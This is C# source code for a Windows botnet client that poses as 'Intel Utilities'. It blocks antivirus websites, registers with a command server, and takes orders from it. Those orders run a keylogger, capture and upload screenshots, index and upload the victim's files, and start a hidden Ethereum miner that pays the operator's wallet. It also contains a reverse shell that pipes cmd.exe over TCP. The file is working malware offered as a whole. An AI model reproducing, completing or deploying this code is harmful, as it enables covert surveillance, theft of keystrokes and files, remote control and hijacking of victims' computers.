using Ionic.Zip;
using Newtonsoft.Json;
using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Botnet
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static OrdersInfo orders = new OrdersInfo();
        static string machineID;
        static string password;
        static bool inspectHardwareLoading = false;
        static bool inspectHardwareRunning = false;
        static bool inspectFilesLoading = false;
        static bool inspectFilesRunning = false;
        static bool keyloggerLoading = false;
        static bool keyloggerRunning = false;
        static bool screenCaptureLoading = false;
        static bool screenCaptureRunning = false;
        static bool filesCaptureLoading = false;
        static bool filesCaptureRunning = false;
        static bool minerLoading = false;
        static bool minerRunning = false;
        static string filesIndex;

        static void Main()
        {
            Utility.DeleteUninstaller();
            Console.WriteLine("Intel Utilities v" + Utility.GetProgramCurrentVersion());
            Console.WriteLine("Starting...");
            Utility.WaitForInternet();

            try
            {
                Utility.BlockAntivirusWebsites();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }

            if (Utility.GetMachineID() != "")
            {
                machineID = Utility.GetMachineID();
                password = Utility.GetPassword();
                Console.WriteLine("MachineID=" + machineID);
                Console.Write("Updating status info...");
                UpdateStatusInfo();
                Console.WriteLine(" DONE");
            }
            else
            {
                Console.Write("Initializing...");
                Initialize();
                Console.WriteLine(" DONE! MachineID=" + machineID);
            }

            while (true)
            {
                try
                {
                    Console.WriteLine("Getting orders...");
                    Utility.WaitForInternet();
                    GetOrders();
                    if (!orders.uninstall)
                    {
                        Console.WriteLine("Starting services...");
                        StartServices();
                        Console.WriteLine("Next orders check in " + orders.ordersInterval + " seconds...");
                        Thread.Sleep(orders.ordersInterval * 1000);
                    }
                    else
                    {
                        KillAllThread();
                        Directory.CreateDirectory(Utility.uninstallerDir);
                        Utility.DownloadFile(Utility.SOFTWARE_REMOTE_DIR + Utility.uninstallerName, Utility.uninstallerDir + Utility.uninstallerName);
                        var uninstallerProcess = Process.Start(Utility.uninstallerDir + Utility.uninstallerName);
                        return;
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }
        }

        private static void Initialize()
        {
            password = Utility.RandomAlphanumeric();
            NameValueCollection postData = new NameValueCollection
            {
                ["operation"] = Utility.INITIALIZE,
                ["password"] = password,
                ["system"] = Utility.WINDOWS_SYSTEM,
                ["programVersion"] = "" + Utility.GetProgramCurrentVersion(),
                ["coordinates"] = "" + Utility.GetCoordinates(),
                ["account"] = HardwareInfo.Account(orders.inspectHardware),
                ["os"] = HardwareInfo.OS(orders.inspectHardware),
                ["language"] = HardwareInfo.Language(),
                ["motherboard"] = HardwareInfo.Motherboard(orders.inspectHardware),
                ["memory"] = HardwareInfo.Memory(orders.inspectHardware),
                ["bios"] = HardwareInfo.Bios(orders.inspectHardware),
                ["cpu"] = HardwareInfo.CPU(orders.inspectHardware),
                ["gpu"] = HardwareInfo.Graphics(orders.inspectHardware),
                ["audio"] = HardwareInfo.SoundCard(orders.inspectHardware),
                ["network"] = HardwareInfo.Network(orders.inspectHardware),
                ["harddrives"] = HardwareInfo.HardDrives(orders.inspectHardware),
                ["cdrom"] = HardwareInfo.CDROMDrive(orders.inspectHardware)
            };
            machineID = Utility.ServerCommunication(postData);
            Utility.StoreMachineID(machineID);
            Utility.StorePassword(password);
        }

        private static void UpdateStatusInfo()
        {
            GeolocationInfo geo = JsonConvert.DeserializeObject<GeolocationInfo>(Utility.GetCoordinates());
            NameValueCollection postData = new NameValueCollection
            {
                ["operation"] = Utility.UPDATE_STATUS_INFO,
                ["machineID"] = machineID,
                ["password"] = password,
                ["programVersion"] = "" + Utility.GetProgramCurrentVersion(),
                ["lat"] = "" + geo.lat,
                ["lon"] = "" + geo.lat
            };
            Utility.ServerCommunication(postData);
        }

        private static void GetOrders()
        {
            NameValueCollection postData = new NameValueCollection
            {
                ["operation"] = Utility.GET_ORDERS,
                ["machineID"] = machineID,
                ["password"] = password
            };
            string response = Utility.ServerCommunication(postData);
            Console.WriteLine(response);

            orders = JsonConvert.DeserializeObject<OrdersInfo>(response);
        }

        private static void KillAllThread()
        {
            orders.DisableAllCommands();
            if (minerRunning)
            {
                KillMiners();
            }
            while (inspectHardwareRunning || inspectFilesRunning || keyloggerRunning || screenCaptureRunning || filesCaptureRunning || minerRunning) ;
        }

        private static void StartServices()
        {
            if (orders.inspectHardware && !inspectHardwareRunning && !inspectHardwareLoading)
            {
                inspectHardwareLoading = true;
                StartInspectHardware();
                Console.WriteLine("Inspect Hardware started!");
            }

            if (orders.inspectFiles && !inspectFilesRunning && !inspectFilesLoading)
            {
                inspectFilesLoading = true;
                StartInspectFiles();
                Console.WriteLine("Inspect Files started!");
            }

            if (orders.screenCapture && !screenCaptureRunning && !screenCaptureLoading)
            {
                screenCaptureLoading = true;
                StartScreenCapture();
                Console.WriteLine("Screen capture started!");
            }

            if (orders.keylogger && !keyloggerRunning && !keyloggerLoading)
            {
                keyloggerLoading = true;
                StartKeylogger();
                Console.WriteLine("Keylogger started!");

            }

            if (orders.filesCapture && !filesCaptureRunning && !filesCaptureLoading)
            {
                filesCaptureLoading = true;
                StartFilesCapture();
                Console.WriteLine("Files capture started!");

            }

            if (orders.mining && !minerRunning && !minerLoading)
            {
                minerLoading = true;
                StartMining();
                Console.WriteLine("Mining started!");
            }

            else if (!orders.mining && minerRunning)
            {
                KillMiners();
            }
        }

        private static void KillMiners()
        {
            Utility.KillProcessByPath(Utility.ethminerDir + "bin\\" + Utility.ethminerName);
            minerRunning = false;
        }

        private static void StartInspectHardware()
        {
            new Thread(() =>
            {
                try
                {
                    inspectHardwareRunning = true;
                    inspectHardwareLoading = false;
                    Thread.CurrentThread.IsBackground = true;

                    NameValueCollection postData = new NameValueCollection
                    {
                        ["operation"] = Utility.UPDATE_HARDWARE_DATA,
                        ["machineID"] = machineID,
                        ["password"] = password,
                        ["account"] = HardwareInfo.Account(orders.inspectHardware),
                        ["os"] = HardwareInfo.OS(orders.inspectHardware),
                        ["language"] = HardwareInfo.Language(),
                        ["motherboard"] = HardwareInfo.Motherboard(orders.inspectHardware),
                        ["memory"] = HardwareInfo.Memory(orders.inspectHardware),
                        ["bios"] = HardwareInfo.Bios(orders.inspectHardware),
                        ["cpu"] = HardwareInfo.CPU(orders.inspectHardware),
                        ["gpu"] = HardwareInfo.Graphics(orders.inspectHardware),
                        ["audio"] = HardwareInfo.SoundCard(orders.inspectHardware),
                        ["network"] = HardwareInfo.Network(orders.inspectHardware),
                        ["harddrives"] = HardwareInfo.HardDrives(orders.inspectHardware),
                        ["cdrom"] = HardwareInfo.CDROMDrive(orders.inspectHardware)
                    };
                    Utility.ServerCommunication(postData);

                    inspectHardwareRunning = false;
                    orders.inspectHardware = false;
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }).Start();
        }

        private static void StartInspectFiles()
        {
            new Thread(() =>
            {
                try
                {
                    inspectFilesRunning = true;
                    inspectFilesLoading = false;
                    Thread.CurrentThread.IsBackground = true;

                    filesIndex = "";
                    foreach (DriveInfo d in DriveInfo.GetDrives())
                    {
                        if (d.Name.Equals(Path.GetPathRoot(Environment.SystemDirectory)))
                        {
                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Downloads));
                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Favorites));
                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Contacts));
                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Documents));
                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Desktop));
                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Pictures));
                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Music));
                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Videos));
                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Recent));
                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Searches));
                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Cookies));
                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.Links));
                            RecursiveIndexFiles(KnownFolders.GetPath(KnownFolder.SavedGames));
                        }
                        else
                        {
                            RecursiveIndexFiles(d.Name);
                        }
                    }
                    File.WriteAllText(Utility.filesIndex, filesIndex.Trim());
                    Utility.UploadFile(Utility.filesIndex, Utility.UPLOAD_INDEX_FILE);
                    File.Delete(Utility.filesIndex);
                    inspectFilesRunning = false;
                    orders.inspectFiles = false;
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }).Start();
        }

        static void RecursiveIndexFiles(string directory)
        {

            foreach (string file in Directory.GetFiles(directory))
            {
                try
                {
                    filesIndex += file + "\t" + HardwareInfo.BytesToHuman(new Delimon.Win32.IO.FileInfo(file).Length) + "\n";
                }
                catch (Exception)
                {

                }
                foreach (string subdir in Directory.GetDirectories(directory))
                {

                    RecursiveIndexFiles(subdir);
                }

            }
        }

        private static void StartScreenCapture()
        {
            Directory.CreateDirectory(Utility.screensDir);
            foreach (string screen in Directory.GetFiles(Utility.screensDir))
            {
                if (Path.GetExtension(screen).Equals(".png"))
                {
                    Utility.UploadFile(screen, Utility.UPLOAD_SCREEN);
                    File.Delete(screen);
                }
            }
            new Thread(() =>
            {
                try
                {
                    screenCaptureRunning = true;
                    screenCaptureLoading = false;
                    Thread.CurrentThread.IsBackground = true;
                    while (orders.screenCapture)
                    {
                        string screenFile = Utility.screensDir + DateTime.Now.ToString("yyyyMMdd-HHmmss") + ".jpg";

                        int screenLeft = SystemInformation.VirtualScreen.Left;
                        int screenTop = SystemInformation.VirtualScreen.Top;
                        int screenWidth = SystemInformation.VirtualScreen.Width;
                        int screenHeight = SystemInformation.VirtualScreen.Height;
                        using (Bitmap bmp = new Bitmap(screenWidth, screenHeight))
                        {
                            using (Graphics g = Graphics.FromImage(bmp))
                            {
                                g.CopyFromScreen(screenLeft, screenTop, 0, 0, bmp.Size);
                            }
                            bmp.Save(screenFile, ImageFormat.Jpeg);
                        }

                        Utility.UploadFile(screenFile, Utility.UPLOAD_SCREEN);
                        File.Delete(screenFile);
                        Thread.Sleep(orders.screenCaptureInterval * 1000);
                    }
                    screenCaptureRunning = false;
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }).Start();
        }

        private static void StartFilesCapture()
        {
            new Thread(() =>
            {
                try
                {
                    filesCaptureRunning = true;
                    filesCaptureLoading = false;
                    Thread.CurrentThread.IsBackground = true;

                    NameValueCollection postData = new NameValueCollection
                    {
                        ["operation"] = Utility.GET_INTERESTING_FILES,
                        ["machineID"] = machineID,
                        ["password"] = password
                    };
                    string interestingFiles = Utility.ServerCommunication(postData).Trim();

                    using (StringReader reader = new StringReader(interestingFiles))
                    {
                        string line;
                        while ((line = reader.ReadLine()) != null)
                        {
                            Utility.UploadFile(line, Utility.UPLOAD_FILE);
                        }
                    }

                    orders.filesCapture = false;
                    filesCaptureRunning = false;
                    Utility.NotifyFilesUploadCompleted();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }).Start();
        }


        private static void StartKeylogger()
        {
            Directory.CreateDirectory(Utility.keysDir);
            foreach (string keysFile in Directory.GetFiles(Utility.keysDir))
            {
                if (Path.GetExtension(keysFile).Equals(".txt"))
                {
                    Utility.UploadFile(keysFile, Utility.UPLOAD_KEYS);
                    File.Delete(keysFile);
                }
            }
            string currentKeysFile = DateTime.Now.ToString("yyyyMMdd-HHmm") + ".txt";
            StreamWriter sw;
            new Thread(() =>
            {
                try
                {
                    keyloggerRunning = true;
                    keyloggerLoading = false;
                    Thread.CurrentThread.IsBackground = true;
                    while (orders.keylogger)
                    {
                        for (int i = 0; i < 255; i++)
                        {
                            int key = GetAsyncKeyState(i);
                            if (key == 1 || key == -32767)
                            {
                                sw = new StreamWriter(Utility.keysDir + currentKeysFile, true);
                                sw.Write(Utility.KeyCodeToString(i));
                                sw.Close();
                                break;
                            }
                        }
                    }
                    keyloggerRunning = false;
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }).Start();
        }

        //TODO add CPU miner
        private static void StartMining()
        {
            if (HardwareInfo.IsNvidiaCardInstalled() || HardwareInfo.IsAmdCardInstalled())
            {
                if ((!File.Exists(Utility.ethminerDir + "bin\\" + Utility.ethminerName)) || (Utility.GetCurrentEthminerVersion() < Utility.GetLatestEthminerVersion()))
                {
                    if (Utility.IsProcessRunningByName(Utility.ethminerName))
                        Utility.KillProcessByPath(Utility.ethminerDir + Utility.ethminerName);
                    Utility.DeleteDirectory(Utility.ethminerDir);
                    Directory.CreateDirectory(Utility.ethminerDir);
                    Utility.DownloadFile(Utility.GetLatestEthminerURL(), Utility.ethminerDir + Utility.ethminerZipName);
                    using (ZipFile zip = ZipFile.Read(Utility.ethminerDir + Utility.ethminerZipName))
                    {
                        zip.ExtractAll(Utility.ethminerDir);
                    }
                    File.Delete(Utility.ethminerDir + Utility.ethminerZipName);
                }
                new Thread(() =>
                {
                    try
                    {
                        Thread.CurrentThread.IsBackground = true;
                        string graphicCardParam = "";
                        if (HardwareInfo.IsNvidiaCardInstalled() && HardwareInfo.IsAmdCardInstalled())
                            graphicCardParam = "--cuda-opencl";
                        else if (HardwareInfo.IsNvidiaCardInstalled())
                            graphicCardParam = "--cuda";
                        else if (HardwareInfo.IsAmdCardInstalled())
                            graphicCardParam = "--opencl";

                        string ethermineClosestServer = Utility.ethermineUS1;
                        double longitude = JsonConvert.DeserializeObject<GeolocationInfo>(Utility.GetCoordinates()).lon;
                        if (Utility.IsLongitudeWestAmerica(longitude))
                            ethermineClosestServer = Utility.ethermineUS2;
                        else if (Utility.IsLongitudeEurope(longitude))
                            ethermineClosestServer = Utility.ethermineEU1;
                        else if (Utility.IsLongitudeAsia(longitude))
                            ethermineClosestServer = Utility.ethermineAsia1;

                        string parameters = "stratum+ssl://" + Utility.ethereumWallet + ".miner" + machineID + "@" + ethermineClosestServer + " " + graphicCardParam;
                        Process minerProcess = new Process();
                        minerProcess.StartInfo.FileName = Utility.ethminerDir + "bin\\" + Utility.ethminerName;
                        minerProcess.StartInfo.Arguments = parameters;
                        minerProcess.StartInfo.CreateNoWindow = true;
                        minerProcess.StartInfo.UseShellExecute = false;
                        minerProcess.Start();

                        minerRunning = true;
                        minerLoading = false;
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }
                }).Start();
            }
            else
            {
                minerLoading = false;
            }
        }

        static StreamWriter streamWriter;

        // TODO
        private void ReverseShell(string ip, int port)
        {
            using (TcpClient client = new TcpClient(ip, port))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);

                        StringBuilder strInput = new StringBuilder();

                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();

                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            //strInput.Append("\n");
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!string.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err)
                {
                    Console.WriteLine(err.StackTrace);
                }
            }
        }

    }
}